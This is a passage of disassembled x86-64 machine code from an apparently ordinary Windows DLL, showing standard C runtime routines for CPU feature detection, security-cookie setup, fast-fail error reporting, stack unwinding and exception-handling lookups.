   180002be7:	00 00 00 
   180002bea:	b8 08 00 00 00       	mov    $0x8,%eax
   180002bef:	48 6b c0 00          	imul   $0x0,%rax,%rax
   180002bf3:	48 8d 0d 26 10 02 00 	lea    0x21026(%rip),%rcx        # 0x180023c20
   180002bfa:	8b 54 24 30          	mov    0x30(%rsp),%edx
   180002bfe:	48 89 14 01          	mov    %rdx,(%rcx,%rax,1)
   180002c02:	48 8d 0d df 57 01 00 	lea    0x157df(%rip),%rcx        # 0x1800183e8
   180002c09:	e8 4e fe ff ff       	call   0x180002a5c
   180002c0e:	48 83 c4 28          	add    $0x28,%rsp
   180002c12:	c3                   	ret
   180002c13:	cc                   	int3
   180002c14:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   180002c19:	57                   	push   %rdi
   180002c1a:	48 83 ec 40          	sub    $0x40,%rsp
   180002c1e:	48 8b d9             	mov    %rcx,%rbx
   180002c21:	ff 15 41 54 01 00    	call   *0x15441(%rip)        # 0x180018068
   180002c27:	48 8b bb f8 00 00 00 	mov    0xf8(%rbx),%rdi
   180002c2e:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   180002c33:	48 8b cf             	mov    %rdi,%rcx
   180002c36:	45 33 c0             	xor    %r8d,%r8d
   180002c39:	ff 15 31 54 01 00    	call   *0x15431(%rip)        # 0x180018070
   180002c3f:	48 85 c0             	test   %rax,%rax
   180002c42:	74 32                	je     0x180002c76
   180002c44:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   180002c4a:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   180002c4f:	48 8b 54 24 50       	mov    0x50(%rsp),%rdx
   180002c54:	4c 8b c8             	mov    %rax,%r9
   180002c57:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   180002c5c:	4c 8b c7             	mov    %rdi,%r8
   180002c5f:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   180002c64:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   180002c69:	33 c9                	xor    %ecx,%ecx
   180002c6b:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   180002c70:	ff 15 02 54 01 00    	call   *0x15402(%rip)        # 0x180018078
   180002c76:	48 8b 5c 24 68       	mov    0x68(%rsp),%rbx
   180002c7b:	48 83 c4 40          	add    $0x40,%rsp
   180002c7f:	5f                   	pop    %rdi
   180002c80:	c3                   	ret
   180002c81:	cc                   	int3
   180002c82:	cc                   	int3
   180002c83:	cc                   	int3
   180002c84:	40 53                	rex push %rbx
   180002c86:	56                   	push   %rsi
   180002c87:	57                   	push   %rdi
   180002c88:	48 83 ec 40          	sub    $0x40,%rsp
   180002c8c:	48 8b d9             	mov    %rcx,%rbx
   180002c8f:	ff 15 d3 53 01 00    	call   *0x153d3(%rip)        # 0x180018068
   180002c95:	48 8b b3 f8 00 00 00 	mov    0xf8(%rbx),%rsi
   180002c9c:	33 ff                	xor    %edi,%edi
   180002c9e:	45 33 c0             	xor    %r8d,%r8d
   180002ca1:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   180002ca6:	48 8b ce             	mov    %rsi,%rcx
   180002ca9:	ff 15 c1 53 01 00    	call   *0x153c1(%rip)        # 0x180018070
   180002caf:	48 85 c0             	test   %rax,%rax
   180002cb2:	74 39                	je     0x180002ced
   180002cb4:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   180002cba:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   180002cbf:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   180002cc4:	4c 8b c8             	mov    %rax,%r9
   180002cc7:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   180002ccc:	4c 8b c6             	mov    %rsi,%r8
   180002ccf:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   180002cd4:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   180002cd9:	33 c9                	xor    %ecx,%ecx
   180002cdb:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   180002ce0:	ff 15 92 53 01 00    	call   *0x15392(%rip)        # 0x180018078
   180002ce6:	ff c7                	inc    %edi
   180002ce8:	83 ff 02             	cmp    $0x2,%edi
   180002ceb:	7c b1                	jl     0x180002c9e
   180002ced:	48 83 c4 40          	add    $0x40,%rsp
   180002cf1:	5f                   	pop    %rdi
   180002cf2:	5e                   	pop    %rsi
   180002cf3:	5b                   	pop    %rbx
   180002cf4:	c3                   	ret
   180002cf5:	cc                   	int3
   180002cf6:	cc                   	int3
   180002cf7:	cc                   	int3
   180002cf8:	e9 b7 90 00 00       	jmp    0x18000bdb4
   180002cfd:	cc                   	int3
   180002cfe:	cc                   	int3
   180002cff:	cc                   	int3
   180002d00:	48 83 ec 48          	sub    $0x48,%rsp
   180002d04:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180002d09:	e8 b6 f4 ff ff       	call   0x1800021c4
   180002d0e:	48 8d 15 ab f4 01 00 	lea    0x1f4ab(%rip),%rdx        # 0x1800221c0
   180002d15:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180002d1a:	e8 2d 0c 00 00       	call   0x18000394c
   180002d1f:	cc                   	int3
   180002d20:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   180002d25:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   180002d2a:	57                   	push   %rdi
   180002d2b:	48 83 ec 10          	sub    $0x10,%rsp
   180002d2f:	33 c0                	xor    %eax,%eax
   180002d31:	33 c9                	xor    %ecx,%ecx
   180002d33:	0f a2                	cpuid
   180002d35:	44 8b c1             	mov    %ecx,%r8d
   180002d38:	45 33 db             	xor    %r11d,%r11d
   180002d3b:	44 8b cb             	mov    %ebx,%r9d
   180002d3e:	41 81 f0 6e 74 65 6c 	xor    $0x6c65746e,%r8d
   180002d45:	41 81 f1 47 65 6e 75 	xor    $0x756e6547,%r9d
   180002d4c:	44 8b d2             	mov    %edx,%r10d
   180002d4f:	8b f0                	mov    %eax,%esi
   180002d51:	33 c9                	xor    %ecx,%ecx
   180002d53:	41 8d 43 01          	lea    0x1(%r11),%eax
   180002d57:	45 0b c8             	or     %r8d,%r9d
   180002d5a:	0f a2                	cpuid
   180002d5c:	41 81 f2 69 6e 65 49 	xor    $0x49656e69,%r10d
   180002d63:	89 04 24             	mov    %eax,(%rsp)
   180002d66:	45 0b ca             	or     %r10d,%r9d
   180002d69:	89 5c 24 04          	mov    %ebx,0x4(%rsp)
   180002d6d:	8b f9                	mov    %ecx,%edi
   180002d6f:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   180002d73:	89 54 24 0c          	mov    %edx,0xc(%rsp)
   180002d77:	75 50                	jne    0x180002dc9
   180002d79:	48 83 0d 9f 02 02 00 	orq    $0xffffffffffffffff,0x2029f(%rip)        # 0x180023020
   180002d80:	ff 
   180002d81:	25 f0 3f ff 0f       	and    $0xfff3ff0,%eax
   180002d86:	3d c0 06 01 00       	cmp    $0x106c0,%eax
   180002d8b:	74 28                	je     0x180002db5
   180002d8d:	3d 60 06 02 00       	cmp    $0x20660,%eax
   180002d92:	74 21                	je     0x180002db5
   180002d94:	3d 70 06 02 00       	cmp    $0x20670,%eax
   180002d99:	74 1a                	je     0x180002db5
   180002d9b:	05 b0 f9 fc ff       	add    $0xfffcf9b0,%eax
   180002da0:	83 f8 20             	cmp    $0x20,%eax
   180002da3:	77 24                	ja     0x180002dc9
   180002da5:	48 b9 01 00 01 00 01 	movabs $0x100010001,%rcx
   180002dac:	00 00 00 
   180002daf:	48 0f a3 c1          	bt     %rax,%rcx
   180002db3:	73 14                	jae    0x180002dc9
   180002db5:	44 8b 05 b4 13 02 00 	mov    0x213b4(%rip),%r8d        # 0x180024170
   180002dbc:	41 83 c8 01          	or     $0x1,%r8d
   180002dc0:	44 89 05 a9 13 02 00 	mov    %r8d,0x213a9(%rip)        # 0x180024170
   180002dc7:	eb 07                	jmp    0x180002dd0
   180002dc9:	44 8b 05 a0 13 02 00 	mov    0x213a0(%rip),%r8d        # 0x180024170
   180002dd0:	b8 07 00 00 00       	mov    $0x7,%eax
   180002dd5:	44 8d 48 fb          	lea    -0x5(%rax),%r9d
   180002dd9:	3b f0                	cmp    %eax,%esi
   180002ddb:	7c 26                	jl     0x180002e03
   180002ddd:	33 c9                	xor    %ecx,%ecx
   180002ddf:	0f a2                	cpuid
   180002de1:	89 04 24             	mov    %eax,(%rsp)
   180002de4:	44 8b db             	mov    %ebx,%r11d
   180002de7:	89 5c 24 04          	mov    %ebx,0x4(%rsp)
   180002deb:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   180002def:	89 54 24 0c          	mov    %edx,0xc(%rsp)
   180002df3:	0f ba e3 09          	bt     $0x9,%ebx
   180002df7:	73 0a                	jae    0x180002e03
   180002df9:	45 0b c1             	or     %r9d,%r8d
   180002dfc:	44 89 05 6d 13 02 00 	mov    %r8d,0x2136d(%rip)        # 0x180024170
   180002e03:	c7 05 0b 02 02 00 01 	movl   $0x1,0x2020b(%rip)        # 0x180023018
   180002e0a:	00 00 00 
   180002e0d:	44 89 0d 08 02 02 00 	mov    %r9d,0x20208(%rip)        # 0x18002301c
   180002e14:	0f ba e7 14          	bt     $0x14,%edi
   180002e18:	0f 83 91 00 00 00    	jae    0x180002eaf
   180002e1e:	44 89 0d f3 01 02 00 	mov    %r9d,0x201f3(%rip)        # 0x180023018
   180002e25:	bb 06 00 00 00       	mov    $0x6,%ebx
   180002e2a:	89 1d ec 01 02 00    	mov    %ebx,0x201ec(%rip)        # 0x18002301c
   180002e30:	0f ba e7 1b          	bt     $0x1b,%edi
   180002e34:	73 79                	jae    0x180002eaf
   180002e36:	0f ba e7 1c          	bt     $0x1c,%edi
   180002e3a:	73 73                	jae    0x180002eaf
   180002e3c:	33 c9                	xor    %ecx,%ecx
   180002e3e:	0f 01 d0             	xgetbv
   180002e41:	48 c1 e2 20          	shl    $0x20,%rdx
   180002e45:	48 0b d0             	or     %rax,%rdx
   180002e48:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   180002e4d:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   180002e52:	22 c3                	and    %bl,%al
   180002e54:	3a c3                	cmp    %bl,%al
   180002e56:	75 57                	jne    0x180002eaf
   180002e58:	8b 05 be 01 02 00    	mov    0x201be(%rip),%eax        # 0x18002301c
   180002e5e:	83 c8 08             	or     $0x8,%eax
   180002e61:	c7 05 ad 01 02 00 03 	movl   $0x3,0x201ad(%rip)        # 0x180023018
   180002e68:	00 00 00 
   180002e6b:	89 05 ab 01 02 00    	mov    %eax,0x201ab(%rip)        # 0x18002301c
   180002e71:	41 f6 c3 20          	test   $0x20,%r11b
   180002e75:	74 38                	je     0x180002eaf
   180002e77:	83 c8 20             	or     $0x20,%eax
   180002e7a:	c7 05 94 01 02 00 05 	movl   $0x5,0x20194(%rip)        # 0x180023018
   180002e81:	00 00 00 
   180002e84:	89 05 92 01 02 00    	mov    %eax,0x20192(%rip)        # 0x18002301c
   180002e8a:	b8 00 00 03 d0       	mov    $0xd0030000,%eax
   180002e8f:	44 23 d8             	and    %eax,%r11d
   180002e92:	44 3b d8             	cmp    %eax,%r11d
   180002e95:	75 18                	jne    0x180002eaf
   180002e97:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   180002e9c:	24 e0                	and    $0xe0,%al
   180002e9e:	3c e0                	cmp    $0xe0,%al
   180002ea0:	75 0d                	jne    0x180002eaf
   180002ea2:	83 0d 73 01 02 00 40 	orl    $0x40,0x20173(%rip)        # 0x18002301c
   180002ea9:	89 1d 69 01 02 00    	mov    %ebx,0x20169(%rip)        # 0x180023018
   180002eaf:	48 8b 5c 24 28       	mov    0x28(%rsp),%rbx
   180002eb4:	33 c0                	xor    %eax,%eax
   180002eb6:	48 8b 74 24 30       	mov    0x30(%rsp),%rsi
   180002ebb:	48 83 c4 10          	add    $0x10,%rsp
   180002ebf:	5f                   	pop    %rdi
   180002ec0:	c3                   	ret
   180002ec1:	cc                   	int3
   180002ec2:	cc                   	int3
   180002ec3:	cc                   	int3
   180002ec4:	b8 01 00 00 00       	mov    $0x1,%eax
   180002ec9:	c3                   	ret
   180002eca:	cc                   	int3
   180002ecb:	cc                   	int3
   180002ecc:	33 c0                	xor    %eax,%eax
   180002ece:	39 05 8c 1e 02 00    	cmp    %eax,0x21e8c(%rip)        # 0x180024d60
   180002ed4:	0f 95 c0             	setne  %al
   180002ed7:	c3                   	ret
   180002ed8:	83 25 95 12 02 00 00 	andl   $0x0,0x21295(%rip)        # 0x180024174
   180002edf:	c3                   	ret
   180002ee0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180002ee5:	55                   	push   %rbp
   180002ee6:	48 8d ac 24 40 fb ff 	lea    -0x4c0(%rsp),%rbp
   180002eed:	ff 
   180002eee:	48 81 ec c0 05 00 00 	sub    $0x5c0,%rsp
   180002ef5:	8b d9                	mov    %ecx,%ebx
   180002ef7:	b9 17 00 00 00       	mov    $0x17,%ecx
   180002efc:	e8 94 44 01 00       	call   0x180017395
   180002f01:	85 c0                	test   %eax,%eax
   180002f03:	74 04                	je     0x180002f09
   180002f05:	8b cb                	mov    %ebx,%ecx
   180002f07:	cd 29                	int    $0x29
   180002f09:	b9 03 00 00 00       	mov    $0x3,%ecx
   180002f0e:	e8 c5 ff ff ff       	call   0x180002ed8
   180002f13:	33 d2                	xor    %edx,%edx
   180002f15:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   180002f19:	41 b8 d0 04 00 00    	mov    $0x4d0,%r8d
   180002f1f:	e8 8c 0d 00 00       	call   0x180003cb0
   180002f24:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   180002f28:	ff 15 3a 51 01 00    	call   *0x1513a(%rip)        # 0x180018068
   180002f2e:	48 8b 9d e8 00 00 00 	mov    0xe8(%rbp),%rbx
   180002f35:	48 8d 95 d8 04 00 00 	lea    0x4d8(%rbp),%rdx
   180002f3c:	48 8b cb             	mov    %rbx,%rcx
   180002f3f:	45 33 c0             	xor    %r8d,%r8d
   180002f42:	ff 15 28 51 01 00    	call   *0x15128(%rip)        # 0x180018070
   180002f48:	48 85 c0             	test   %rax,%rax
   180002f4b:	74 3c                	je     0x180002f89
   180002f4d:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   180002f53:	48 8d 8d e0 04 00 00 	lea    0x4e0(%rbp),%rcx
   180002f5a:	48 8b 95 d8 04 00 00 	mov    0x4d8(%rbp),%rdx
   180002f61:	4c 8b c8             	mov    %rax,%r9
   180002f64:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   180002f69:	4c 8b c3             	mov    %rbx,%r8
   180002f6c:	48 8d 8d e8 04 00 00 	lea    0x4e8(%rbp),%rcx
   180002f73:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   180002f78:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   180002f7c:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   180002f81:	33 c9                	xor    %ecx,%ecx
   180002f83:	ff 15 ef 50 01 00    	call   *0x150ef(%rip)        # 0x180018078
   180002f89:	48 8b 85 c8 04 00 00 	mov    0x4c8(%rbp),%rax
   180002f90:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   180002f95:	48 89 85 e8 00 00 00 	mov    %rax,0xe8(%rbp)
   180002f9c:	33 d2                	xor    %edx,%edx
   180002f9e:	48 8d 85 c8 04 00 00 	lea    0x4c8(%rbp),%rax
   180002fa5:	41 b8 98 00 00 00    	mov    $0x98,%r8d
   180002fab:	48 83 c0 08          	add    $0x8,%rax
   180002faf:	48 89 85 88 00 00 00 	mov    %rax,0x88(%rbp)
   180002fb6:	e8 f5 0c 00 00       	call   0x180003cb0
   180002fbb:	48 8b 85 c8 04 00 00 	mov    0x4c8(%rbp),%rax
   180002fc2:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   180002fc7:	c7 44 24 50 15 00 00 	movl   $0x40000015,0x50(%rsp)
   180002fce:	40 
   180002fcf:	c7 44 24 54 01 00 00 	movl   $0x1,0x54(%rsp)
   180002fd6:	00 
   180002fd7:	ff 15 cb 50 01 00    	call   *0x150cb(%rip)        # 0x1800180a8
   180002fdd:	83 f8 01             	cmp    $0x1,%eax
   180002fe0:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   180002fe5:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   180002fea:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
   180002fee:	0f 94 c3             	sete   %bl
   180002ff1:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   180002ff6:	33 c9                	xor    %ecx,%ecx
   180002ff8:	ff 15 8a 50 01 00    	call   *0x1508a(%rip)        # 0x180018088
   180002ffe:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   180003003:	ff 15 77 50 01 00    	call   *0x15077(%rip)        # 0x180018080
   180003009:	85 c0                	test   %eax,%eax
   18000300b:	75 0c                	jne    0x180003019
   18000300d:	84 db                	test   %bl,%bl
   18000300f:	75 08                	jne    0x180003019
   180003011:	8d 48 03             	lea    0x3(%rax),%ecx
   180003014:	e8 bf fe ff ff       	call   0x180002ed8
   180003019:	48 8b 9c 24 d0 05 00 	mov    0x5d0(%rsp),%rbx
   180003020:	00 
   180003021:	48 81 c4 c0 05 00 00 	add    $0x5c0,%rsp
   180003028:	5d                   	pop    %rbp
   180003029:	c3                   	ret
   18000302a:	cc                   	int3
   18000302b:	cc                   	int3
   18000302c:	c2 00 00             	ret    $0x0
   18000302f:	cc                   	int3
   180003030:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   180003035:	55                   	push   %rbp
   180003036:	48 8b ec             	mov    %rsp,%rbp
   180003039:	48 83 ec 20          	sub    $0x20,%rsp
   18000303d:	48 8b 05 cc ff 01 00 	mov    0x1ffcc(%rip),%rax        # 0x180023010
   180003044:	48 bb 32 a2 df 2d 99 	movabs $0x2b992ddfa232,%rbx
   18000304b:	2b 00 00 
   18000304e:	48 3b c3             	cmp    %rbx,%rax
   180003051:	75 74                	jne    0x1800030c7
   180003053:	48 83 65 18 00       	andq   $0x0,0x18(%rbp)
   180003058:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   18000305c:	ff 15 76 50 01 00    	call   *0x15076(%rip)        # 0x1800180d8
   180003062:	48 8b 45 18          	mov    0x18(%rbp),%rax
   180003066:	48 89 45 10          	mov    %rax,0x10(%rbp)
   18000306a:	ff 15 60 50 01 00    	call   *0x15060(%rip)        # 0x1800180d0
   180003070:	8b c0                	mov    %eax,%eax
   180003072:	48 31 45 10          	xor    %rax,0x10(%rbp)
   180003076:	ff 15 4c 50 01 00    	call   *0x1504c(%rip)        # 0x1800180c8
   18000307c:	8b c0                	mov    %eax,%eax
   18000307e:	48 8d 4d 20          	lea    0x20(%rbp),%rcx
   180003082:	48 31 45 10          	xor    %rax,0x10(%rbp)
   180003086:	ff 15 34 50 01 00    	call   *0x15034(%rip)        # 0x1800180c0
   18000308c:	8b 45 20             	mov    0x20(%rbp),%eax
   18000308f:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   180003093:	48 c1 e0 20          	shl    $0x20,%rax
   180003097:	48 33 45 20          	xor    0x20(%rbp),%rax
   18000309b:	48 33 45 10          	xor    0x10(%rbp),%rax
   18000309f:	48 33 c1             	xor    %rcx,%rax
   1800030a2:	48 b9 ff ff ff ff ff 	movabs $0xffffffffffff,%rcx
   1800030a9:	ff 00 00 
   1800030ac:	48 23 c1             	and    %rcx,%rax
   1800030af:	48 b9 33 a2 df 2d 99 	movabs $0x2b992ddfa233,%rcx
   1800030b6:	2b 00 00 
   1800030b9:	48 3b c3             	cmp    %rbx,%rax
   1800030bc:	48 0f 44 c1          	cmove  %rcx,%rax
   1800030c0:	48 89 05 49 ff 01 00 	mov    %rax,0x1ff49(%rip)        # 0x180023010
   1800030c7:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   1800030cc:	48 f7 d0             	not    %rax
   1800030cf:	48 89 05 32 ff 01 00 	mov    %rax,0x1ff32(%rip)        # 0x180023008
   1800030d6:	48 83 c4 20          	add    $0x20,%rsp
   1800030da:	5d                   	pop    %rbp
   1800030db:	c3                   	ret
   1800030dc:	48 8d 0d 9d 10 02 00 	lea    0x2109d(%rip),%rcx        # 0x180024180
   1800030e3:	48 ff 25 f6 4f 01 00 	rex.W jmp *0x14ff6(%rip)        # 0x1800180e0
   1800030ea:	cc                   	int3
   1800030eb:	cc                   	int3
   1800030ec:	48 8d 0d 8d 10 02 00 	lea    0x2108d(%rip),%rcx        # 0x180024180
   1800030f3:	e9 70 0d 00 00       	jmp    0x180003e68
   1800030f8:	48 8d 05 91 10 02 00 	lea    0x21091(%rip),%rax        # 0x180024190
   1800030ff:	c3                   	ret
   180003100:	48 83 ec 28          	sub    $0x28,%rsp
   180003104:	e8 27 df ff ff       	call   0x180001030
   180003109:	48 83 08 24          	orq    $0x24,(%rax)
   18000310d:	e8 e6 ff ff ff       	call   0x1800030f8
   180003112:	48 83 08 02          	orq    $0x2,(%rax)
   180003116:	48 83 c4 28          	add    $0x28,%rsp
   18000311a:	c3                   	ret
   18000311b:	cc                   	int3
   18000311c:	48 8d 05 35 1c 02 00 	lea    0x21c35(%rip),%rax        # 0x180024d58
   180003123:	c3                   	ret
   180003124:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180003129:	57                   	push   %rdi
   18000312a:	48 83 ec 20          	sub    $0x20,%rsp
   18000312e:	48 8d 1d 53 de 01 00 	lea    0x1de53(%rip),%rbx        # 0x180020f88
   180003135:	48 8d 3d 4c de 01 00 	lea    0x1de4c(%rip),%rdi        # 0x180020f88
   18000313c:	eb 12                	jmp    0x180003150
   18000313e:	48 8b 03             	mov    (%rbx),%rax
   180003141:	48 85 c0             	test   %rax,%rax
   180003144:	74 06                	je     0x18000314c
   180003146:	ff 15 64 51 01 00    	call   *0x15164(%rip)        # 0x1800182b0
   18000314c:	48 83 c3 08          	add    $0x8,%rbx
   180003150:	48 3b df             	cmp    %rdi,%rbx
   180003153:	72 e9                	jb     0x18000313e
   180003155:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000315a:	48 83 c4 20          	add    $0x20,%rsp
   18000315e:	5f                   	pop    %rdi
   18000315f:	c3                   	ret
   180003160:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180003165:	57                   	push   %rdi
   180003166:	48 83 ec 20          	sub    $0x20,%rsp
   18000316a:	48 8d 1d 27 de 01 00 	lea    0x1de27(%rip),%rbx        # 0x180020f98
   180003171:	48 8d 3d 20 de 01 00 	lea    0x1de20(%rip),%rdi        # 0x180020f98
   180003178:	eb 12                	jmp    0x18000318c
   18000317a:	48 8b 03             	mov    (%rbx),%rax
   18000317d:	48 85 c0             	test   %rax,%rax
   180003180:	74 06                	je     0x180003188
   180003182:	ff 15 28 51 01 00    	call   *0x15128(%rip)        # 0x1800182b0
   180003188:	48 83 c3 08          	add    $0x8,%rbx
   18000318c:	48 3b df             	cmp    %rdi,%rbx
   18000318f:	72 e9                	jb     0x18000317a
   180003191:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180003196:	48 83 c4 20          	add    $0x20,%rsp
   18000319a:	5f                   	pop    %rdi
   18000319b:	c3                   	ret
   18000319c:	cc                   	int3
   18000319d:	cc                   	int3
   18000319e:	cc                   	int3
   18000319f:	cc                   	int3
   1800031a0:	48 8b c4             	mov    %rsp,%rax
   1800031a3:	4c 89 48 20          	mov    %r9,0x20(%rax)
   1800031a7:	4c 89 40 18          	mov    %r8,0x18(%rax)
   1800031ab:	48 89 50 10          	mov    %rdx,0x10(%rax)
   1800031af:	48 89 48 08          	mov    %rcx,0x8(%rax)
   1800031b3:	53                   	push   %rbx
   1800031b4:	48 83 ec 70          	sub    $0x70,%rsp
   1800031b8:	48 8b d9             	mov    %rcx,%rbx
   1800031bb:	83 60 c8 00          	andl   $0x0,-0x38(%rax)
   1800031bf:	48 89 48 e0          	mov    %rcx,-0x20(%rax)
   1800031c3:	4c 89 40 e8          	mov    %r8,-0x18(%rax)
   1800031c7:	e8 38 0d 00 00       	call   0x180003f04
   1800031cc:	48 8d 54 24 58       	lea    0x58(%rsp),%rdx
   1800031d1:	8b 0b                	mov    (%rbx),%ecx
   1800031d3:	48 8b 40 10          	mov    0x10(%rax),%rax
   1800031d7:	ff 15 d3 50 01 00    	call   *0x150d3(%rip)        # 0x1800182b0
   1800031dd:	c7 44 24 40 00 00 00 	movl   $0x0,0x40(%rsp)
   1800031e4:	00 
   1800031e5:	eb 00                	jmp    0x1800031e7
   1800031e7:	8b 44 24 40          	mov    0x40(%rsp),%eax
   1800031eb:	48 83 c4 70          	add    $0x70,%rsp
   1800031ef:	5b                   	pop    %rbx
   1800031f0:	c3                   	ret
   1800031f1:	cc                   	int3
   1800031f2:	cc                   	int3
   1800031f3:	cc                   	int3
   1800031f4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800031f9:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1800031fe:	57                   	push   %rdi
   1800031ff:	48 83 ec 20          	sub    $0x20,%rsp
   180003203:	8b 59 0c             	mov    0xc(%rcx),%ebx
   180003206:	8b fa                	mov    %edx,%edi
   180003208:	48 8b f1             	mov    %rcx,%rsi
   18000320b:	85 db                	test   %ebx,%ebx
   18000320d:	74 26                	je     0x180003235
   18000320f:	ff cb                	dec    %ebx
   180003211:	e8 ee 0c 00 00       	call   0x180003f04
   180003216:	48 8d 0c 9b          	lea    (%rbx,%rbx,4),%rcx
   18000321a:	48 8b 40 60          	mov    0x60(%rax),%rax
   18000321e:	48 8d 14 88          	lea    (%rax,%rcx,4),%rdx
   180003222:	48 63 46 10          	movslq 0x10(%rsi),%rax
   180003226:	48 03 c2             	add    %rdx,%rax
   180003229:	3b 78 04             	cmp    0x4(%rax),%edi
   18000322c:	7e dd                	jle    0x18000320b
   18000322e:	3b 78 08             	cmp    0x8(%rax),%edi
   180003231:	7f d8                	jg     0x18000320b
   180003233:	eb 02                	jmp    0x180003237
   180003235:	33 c0                	xor    %eax,%eax
   180003237:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000323c:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   180003241:	48 83 c4 20          	add    $0x20,%rsp
   180003245:	5f                   	pop    %rdi
   180003246:	c3                   	ret
   180003247:	cc                   	int3
   180003248:	40 53                	rex push %rbx
   18000324a:	48 83 ec 20          	sub    $0x20,%rsp
   18000324e:	48 8b da             	mov    %rdx,%rbx
   180003251:	48 8b d1             	mov    %rcx,%rdx
   180003254:	48 8b cb             	mov    %rbx,%rcx
   180003257:	e8 8c 0e 00 00       	call   0x1800040e8
   18000325c:	8b d0                	mov    %eax,%edx
   18000325e:	48 8b cb             	mov    %rbx,%rcx
   180003261:	e8 8e ff ff ff       	call   0x1800031f4
   180003266:	48 85 c0             	test   %rax,%rax
   180003269:	0f 95 c0             	setne  %al
   18000326c:	48 83 c4 20          	add    $0x20,%rsp
   180003270:	5b                   	pop    %rbx
   180003271:	c3                   	ret
   180003272:	cc                   	int3
   180003273:	cc                   	int3
   180003274:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180003279:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   18000327e:	57                   	push   %rdi
   18000327f:	48 83 ec 20          	sub    $0x20,%rsp
   180003283:	4c 8d 4c 24 48       	lea    0x48(%rsp),%r9
   180003288:	49 8b d8             	mov    %r8,%rbx
   18000328b:	48 8b fa             	mov    %rdx,%rdi
   18000328e:	e8 45 00 00 00       	call   0x1800032d8
   180003293:	48 8b d7             	mov    %rdi,%rdx
   180003296:	48 8b cb             	mov    %rbx,%rcx
   180003299:	48 8b f0             	mov    %rax,%rsi
   18000329c:	e8 47 0e 00 00       	call   0x1800040e8
   1800032a1:	8b d0                	mov    %eax,%edx
   1800032a3:	48 8b cb             	mov    %rbx,%rcx
   1800032a6:	e8 49 ff ff ff       	call   0x1800031f4
   1800032ab:	48 85 c0             	test   %rax,%rax
   1800032ae:	75 06                	jne    0x1800032b6
   1800032b0:	41 83 c9 ff          	or     $0xffffffff,%r9d
   1800032b4:	eb 04                	jmp    0x1800032ba
   1800032b6:	44 8b 48 04          	mov    0x4(%rax),%r9d
   1800032ba:	4c 8b c3             	mov    %rbx,%r8
   1800032bd:	48 8b d7             	mov    %rdi,%rdx
   1800032c0:	48 8b ce             	mov    %rsi,%rcx
   1800032c3:	e8 74 1f 00 00       	call   0x18000523c
   1800032c8:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1800032cd:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1800032d2:	48 83 c4 20          	add    $0x20,%rsp
   1800032d6:	5f                   	pop    %rdi
   1800032d7:	c3                   	ret
   1800032d8:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1800032dd:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   1800032e2:	56                   	push   %rsi
   1800032e3:	57                   	push   %rdi
   1800032e4:	41 54                	push   %r12
   1800032e6:	41 56                	push   %r14
   1800032e8:	41 57                	push   %r15
   1800032ea:	48 83 ec 20          	sub    $0x20,%rsp
   1800032ee:	41 8b 78 0c          	mov    0xc(%r8),%edi
   1800032f2:	4c 8b e1             	mov    %rcx,%r12
   1800032f5:	49 8b c8             	mov    %r8,%rcx
   1800032f8:	49 8b f1             	mov    %r9,%rsi
   1800032fb:	4d 8b f0             	mov    %r8,%r14
   1800032fe:	4c 8b fa             	mov    %rdx,%r15
   180003301:	e8 e2 0d 00 00       	call   0x1800040e8
   180003306:	4d 8b 14 24          	mov    (%r12),%r10
